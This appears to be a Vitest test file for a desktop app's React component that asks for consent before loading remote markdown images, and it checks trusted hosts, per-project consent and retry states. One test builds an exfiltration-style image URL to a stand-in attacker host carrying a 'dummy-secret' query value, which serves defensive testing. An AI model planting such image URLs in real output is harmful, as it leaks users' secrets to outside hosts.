// @vitest-environment jsdom
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { act } from "react";
import { createRoot, type Root } from "react-dom/client";
import Markdown from "react-markdown";
import { afterEach, beforeEach, expect, it, vi } from "vitest";
import { desktopApi } from "../lib/desktop-api.js";
import { FilePreviewProjectContext } from "./file-preview.js";
import { RemoteImage } from "./remote-image.js";

const gitChanges = vi.hoisted(
  () => new Set<(event: { projectId: string }) => void>(),
);
vi.mock("../lib/desktop-api.js", () => ({
  desktopApi: {
    trustedHosts: async () => ({ defaults: [], project: [], mine: [] }),
    onTrustedHostsChanged: () => () => {},
    onGitChanged: (listener: (event: { projectId: string }) => void) => {
      gitChanges.add(listener);
      return () => {
        gitChanges.delete(listener);
      };
    },
    trustHost: vi.fn(async () => {}),
  },
}));
const components = {
  img: ({ src, alt }: { src?: string; alt?: string }) =>
    src ? <RemoteImage src={src} alt={alt ?? ""} /> : null,
};
let node: HTMLDivElement;
let root: Root;
let client: QueryClient;
beforeEach(() => {
  vi.mocked(desktopApi.trustHost).mockReset().mockResolvedValue(undefined);
  Reflect.set(globalThis, "IS_REACT_ACT_ENVIRONMENT", true);
  node = document.createElement("div");
  document.body.append(node);
  root = createRoot(node);
  client = new QueryClient({
    defaultOptions: { queries: { retry: false, gcTime: 0 } },
  });
  client.setQueryData(["trusted-hosts", "first"], []);
  client.setQueryData(["trusted-hosts", "second"], []);
});
afterEach(() => {
  act(() => root.unmount());
  client.clear();
  node.remove();
  Reflect.set(globalThis, "IS_REACT_ACT_ENVIRONMENT", false);
});
async function render(text: string, projectId = "first") {
  await act(async () =>
    root.render(
      <QueryClientProvider client={client}>
        <FilePreviewProjectContext value={projectId}>
          <Markdown components={components}>{text}</Markdown>
        </FilePreviewProjectContext>
      </QueryClientProvider>,
    ),
  );
}
async function show() {
  const button = [...node.querySelectorAll("button")].find(
    (button) => button.textContent === "Show",
  );
  expect(button).toBeDefined();
  await act(async () => button?.click());
}

it("asks again when append-only reference streaming changes the image's host", async () => {
  const initial = "![chart][ref]\n\n[ref]: https://first.example";
  await render(initial);
  expect(node.querySelector("img")).toBeNull();
  await show();
  expect(node.querySelector("img")?.getAttribute("src")).toBe(
    "https://first.example",
  );
  await render(`${initial}.attacker.example/leak.png?d=dummy-secret`);
  expect(node.querySelector("img")).toBeNull();
  expect(node.textContent).toContain("first.example.attacker.example");
});

it("binds Show to the whole URL rather than just its host", async () => {
  await render("![chart](https://first.example/chart.png?version=1)");
  await show();
  await render("![chart](https://first.example/chart.png?version=2)");
  expect(node.querySelector("img")).toBeNull();
  await show();
  expect(node.querySelector("img")?.getAttribute("src")).toContain("version=2");
});

it("does not carry one-time consent into another project", async () => {
  const text = "![chart](https://first.example/chart.png)";
  await render(text);
  await show();
  await render(text, "second");
  expect(node.querySelector("img")).toBeNull();
});

it("refreshes shared trust after this project's publication changes", async () => {
  client.setQueryData(["trusted-hosts", "first"], ["first.example"]);
  await render("![chart](https://first.example/chart.png)");
  expect(node.querySelector("img")).not.toBeNull();
  await act(async () => {
    for (const listener of gitChanges) listener({ projectId: "second" });
  });
  expect(node.querySelector("img")).not.toBeNull();
  await act(async () => {
    for (const listener of gitChanges) listener({ projectId: "first" });
    await vi.waitFor(() =>
      expect(client.getQueryData(["trusted-hosts", "first"])).toEqual([]),
    );
  });
  expect(node.querySelector("img")).toBeNull();
  expect(node.textContent).toContain("first.example");
});

it("loads from approved hosts and resets failed-image state for a new URL", async () => {
  client.setQueryData(["trusted-hosts", "first"], ["first.example"]);
  await render("![chart](https://first.example/broken.png)");
  expect(node.querySelector("img")).not.toBeNull();
  await act(async () =>
    node.querySelector("img")?.dispatchEvent(new Event("error")),
  );
  expect(node.querySelector('[data-remote-image="failed"]')).not.toBeNull();
  await render("![chart](https://first.example/working.png)");
  expect(node.querySelector("img")?.getAttribute("src")).toBe(
    "https://first.example/working.png",
  );
  expect(node.querySelector('[data-remote-image="failed"]')).toBeNull();
});

it("keeps the consent controls mounted and disables repeated requests until the image loads", async () => {
  await render("![chart](https://first.example/chart.png)");
  const pill = node.querySelector("[data-remote-image-placeholder]");
  const buttons = [...node.querySelectorAll("button")];
  await show();
  expect(node.querySelector("[data-remote-image-placeholder]")).toBe(pill);
  expect(buttons.every((button) => button.disabled)).toBe(true);
  expect(buttons[0]?.getAttribute("aria-busy")).toBe("true");
  expect(node.querySelector("img")).not.toBeNull();
  await act(async () =>
    node.querySelector("img")?.dispatchEvent(new Event("error")),
  );
  expect(node.querySelector("[data-remote-image-placeholder]")).toBe(pill);
  expect(node.textContent).toContain("Image unavailable");
  expect(buttons.every((button) => !button.disabled)).toBe(true);
  await show();
  expect(node.querySelector("img")).not.toBeNull();
});

it("keeps the host action pending until it is saved, and offers retry when saving fails", async () => {
  let reject!: (cause: Error) => void;
  vi.mocked(desktopApi.trustHost).mockImplementationOnce(
    () =>
      new Promise<void>((_resolve, fail) => {
        reject = fail;
      }),
  );
  await render("![chart](https://first.example/chart.png)");
  const pill = node.querySelector("[data-remote-image-placeholder]");
  const always = node.querySelector<HTMLButtonElement>(
    'button[aria-label="Always show images from first.example"]',
  )!;
  await act(async () => always.click());
  expect(node.querySelector("img")).toBeNull();
  expect(always.getAttribute("aria-busy")).toBe("true");
  await act(async () => reject(new Error("fixture save failure")));
  expect(node.querySelector("[data-remote-image-placeholder]")).toBe(pill);
  expect(always.disabled).toBe(false);
  expect(node.textContent).toContain("Host could not be saved");
  await act(async () => always.click());
  expect(vi.mocked(desktopApi.trustHost)).toHaveBeenCalledTimes(2);
  expect(node.querySelector("[data-remote-image-placeholder]")).toBe(pill);
  expect(node.querySelector("img")).not.toBeNull();
});
